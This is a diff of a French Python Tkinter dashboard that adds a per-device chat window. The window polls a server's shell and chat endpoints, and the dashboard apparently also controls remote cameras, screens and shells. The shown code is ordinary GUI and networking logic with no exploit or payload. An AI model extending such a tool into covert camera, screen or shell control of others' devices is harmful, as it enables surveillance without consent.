+        entry_frame = tk.Frame(win, bg=COLOR_BG)
+        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
+        msg_var = tk.StringVar()
+        entry = ttk.Entry(entry_frame, textvariable=msg_var)
+        entry.pack(side="left", fill="x", expand=True, ipady=4)
+        entry.focus_set()
+
+        def append_history(role: str, text: str):
+            history["state"] = "normal"
+            prefix = "Auteur: " if role == "moi" else "Toi: "
+            tag = "moi" if role == "moi" else "client"
+            history.insert("end", prefix + text + "\n", tag)
+            history.see("end")
+            history["state"] = "disabled"
+
+        def send_message(event=None):
+            msg = msg_var.get().strip()
+            if not msg:
+                return
+            msg_var.set("")
+            append_history("moi", msg)
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat",
+                    json={"device_id": device_id, "message": msg},
+                    timeout=REQUEST_TIMEOUT,
+                )
+            except requests.RequestException as exc:
+                append_history("client", f"[erreur réseau : {exc}]")
+
+        entry.bind("<Return>", send_message)
+        ttk.Button(entry_frame, text="Envoyer", command=send_message).pack(side="left", padx=(8, 0))
+
+        def refresh():
+            if not win.winfo_exists():
+                self._chat_windows.pop(device_id, None)
+                return
+            try:
+                st = requests.get(
+                    f"{self.server_url}/api/shell/chat_window/state",
+                    params={"device_id": device_id}, timeout=2,
+                )
+                if st.status_code == 200:
+                    data = st.json()
+                    remote_state_var.set(
+                        "Console distante : " + ("● ouverte" if data.get("window_open") else "● fermée")
+                    )
+                resp = requests.get(
+                    f"{self.server_url}/api/shell/results",
+                    params={"device_id": device_id}, timeout=2,
+                )
+                if resp.status_code == 200:
+                    for msg in resp.json().get("chat_in", []):
+                        append_history("client", msg["message"])
+            except requests.RequestException:
+                pass
+            win.after(SHELL_CHAT_POLL_INTERVAL_MS, refresh)
+
+        refresh()
+        win.protocol("WM_DELETE_WINDOW", lambda: self._close_chat_window(device_id, win))
+
+    def _close_chat_window(self, device_id: str, win: tk.Toplevel) -> None:
+        try:
+            win.destroy()
+        except Exception:
+            pass
+        self._chat_windows.pop(device_id, None)
+
+    # ------------------------------------------------------------------
+    # Fermeture
+    # ------------------------------------------------------------------
     def _on_close(self) -> None:
-        for key in self.panels:
-            if self.panels[key].recording:
+        """Arrête proprement les enregistrements en cours, puis ferme la fenêtre."""
+        for key, panel in self.panels.items():
+            if panel.recording:
                 self._stop_recording(key)
         self.root.destroy()
 
 
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Interface de contrôle caméra / écran")
+    parser = argparse.ArgumentParser(description="Dashboard de contrôle caméra / écran / shell / chat")
     parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.com)")
     parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
     return parser.parse_args()
